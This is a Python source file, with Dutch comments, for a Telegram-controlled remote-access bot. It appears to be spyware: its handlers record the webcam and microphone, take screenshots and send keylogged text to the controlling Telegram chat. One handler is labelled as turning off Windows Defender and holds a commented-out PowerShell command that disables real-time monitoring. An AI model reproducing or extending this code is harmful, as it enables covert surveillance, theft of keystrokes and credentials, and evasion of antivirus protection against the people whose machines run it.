# Deze file bevat alle commands die via telegram chat uitgevoerd kunnen worden
from telegram import Update
from telegram.ext import ContextTypes
from functions import *


# functies die starten zodra de bot online is
async def startup_functions(app, id):
    # stuur de banner naar de chat als de bot online staat
    await app.bot.send_message(chat_id=id, text=f"```\n{get_banner()}\n```", parse_mode="MarkdownV2")

# lijst van alle commands terug geven
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(get_command_list())

# Reactie om alles dat geen slash command is
async def no_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Ik reageer alleen op slash commands. Gebruik /help voor een overzicht van alle commands.")

# webcam recording maken
async def cam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # meld dat cam recording begonnen is
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Webcam opname is begonnen...")
    # start recording
    # Source: https://stackoverflow.com/questions/47615956/send-video-through-telegram-python-api
    await context.bot.send_video(
        chat_id=update.effective_chat.id,
        video=open(get_camRecording(), 'rb'),
        supports_streaming=True
    )

# Screenshot maken
async def ss_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_photo(
        chat_id=update.effective_chat.id,
        photo=open(get_screen(), 'rb'),
        caption='Screenshot of the main screen'
    )

# key logged string sturen naar chat
async def keylog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    string = key_log()
    await context.bot.send_photo(
        chat_id=update.effective_chat.id,
        photo=open(get_screen(), 'rb'),
        caption=f'string:   {string}'
    )

# audio recording sturen naar chat
async def audio_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # meld dat audio recording begonnen is
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Audio opname is begonnen...")
    await context.bot.send_voice(
        chat_id=update.effective_chat.id,
        voice=open(get_audioFile(), 'rb'),
    )

# Windows defender uitzetten
async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # meld dat Windows defender uit is
    # powershell_command('Set-MpPreference -DisableRealtimeMonitoring $true')
    powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
    commandOutput = powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
    await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')

# Log errors
async def log_error(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f'Update {update} caused error {context.error}')
